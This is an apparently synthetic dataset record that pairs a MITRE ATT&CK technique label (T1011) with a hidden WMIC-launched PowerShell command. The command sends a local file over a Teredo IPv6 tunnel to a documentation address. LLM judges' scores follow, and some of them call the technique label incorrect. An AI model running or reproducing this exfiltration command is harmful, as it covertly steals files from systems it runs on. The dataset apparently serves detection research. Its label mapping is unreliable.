{
  "technique_id": "T1011",
  "platform": "Windows",
  "shell": "Powershell",
  "command": "wmic process call create \"powershell -NoProfile -WindowStyle Hidden -Command `$ifc=Get-WmiObject Win32_NetworkAdapterConfiguration | ?{ `$_.IPEnabled -and (`$_.Description -like '*Teredo*') }; if(`$ifc){ `$ip6=@(`$ifc.IPAddress | ?{ `$_ -like '*:*' })[0]; if(`$ip6){ `$c=New-Object Net.Sockets.TcpClient([Net.Sockets.AddressFamily]::InterNetworkV6); `$c.Client.Bind((New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(`$ip6),0))); `$rv6=[Net.IPAddress]::Parse('2001:db8::50'); `$c.Connect(`$rv6,53456); `$s=`$c.GetStream(); `$b=[IO.File]::ReadAllBytes('C:\\ProgramData\\Diagnostics\\etl.bin'); `$s.Write(`$b,0,`$b.Length); `$s.Close(); `$c.Close() } }\"",
  "explanation": "Starts a hidden PowerShell via WMIC that binds an IPv6 TCP client to the Teredo tunneling interface and exfiltrates a file to an IPv6 address on a high port. This uses an IPv6 tunnel as an alternate medium in line with T1011.",
  "rationale_steps": [
    "Query for the Teredo tunneling adapter and obtain its IPv6 address.",
    "Create an IPv6 TCP client and bind it to the Teredo-local address.",
    "Connect to an IPv6 external host on an uncommon port.",
    "Stream file data through the Teredo path, separate from primary IPv4 LAN.",
    "Limit scope to the process, avoiding global network changes."
  ],
  "obfuscation_level": "none",
  "id": "SYN-POWERSHELL-T1011-987933e0-e336a109",
  "source_prompt_hash": "987933e0",
  "timestamp_utc": "2025-09-30T08:13:32.291694Z",
  "validation": {
    "syntax_ok": true,
    "llm_judgments": [
      {
        "model": "gpt-5",
        "syntactic_score": 4,
        "syntactic_justification": "Balanced WMIC quoting and valid PowerShell syntax with proper escaping, though the unquoted -Command payload may be tokenized into multiple arguments.",
        "semantic_score": 1,
        "semantic_justification": "It performs IPv6/Teredo network exfiltration to a (non-routable) documentation IPv6 address, which does not align with exfiltration over a physical medium as defined for T1011.",
        "combined_score": 2.5,
        "confidence": 0.78,
        "timestamp": "2025-10-01T10:06:43.432994Z"
      },
      {
        "model": "claude-3-7-sonnet",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed with properly balanced quotes, backticks, parentheses, and braces, with correct PowerShell syntax including proper variable declarations, method calls, and pipeline operations.",
        "semantic_score": 4,
        "semantic_justification": "The command effectively implements exfiltration by using IPv6 Teredo tunneling as an alternate communication channel to transfer a file, though it's not strictly a physical medium as described in T1011 but rather a network tunneling technique.",
        "combined_score": 4.5,
        "confidence": 0.9,
        "timestamp": "2025-10-01T10:06:46.751022Z"
      },
      {
        "model": "gemini-2.0-flash-thinking-exp",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed with correct escaping for PowerShell variables within the string passed to WMIC, ensuring proper parsing and execution.",
        "semantic_score": 2,
        "semantic_justification": "While the command operationally achieves network-based file exfiltration via a Teredo tunnel, its categorization under MITRE ATT&CK T1011 (Exfiltration Over Physical Medium) is fundamentally incorrect, as a network tunnel is not a physical medium.",
        "combined_score": 3.5,
        "confidence": 1.0,
        "timestamp": "2025-10-01T10:07:10.237573Z"
      }
    ],
    "llm_average_syntactic": 4.667,
    "llm_average_semantic": 2.333,
    "llm_average_score": 3.5,
    "llm_verdict": "uncertain",
    "sandbox_trace_id": null,
    "mitre_match_score": null,
    "Syntax_Run_Details": ""
  }
}
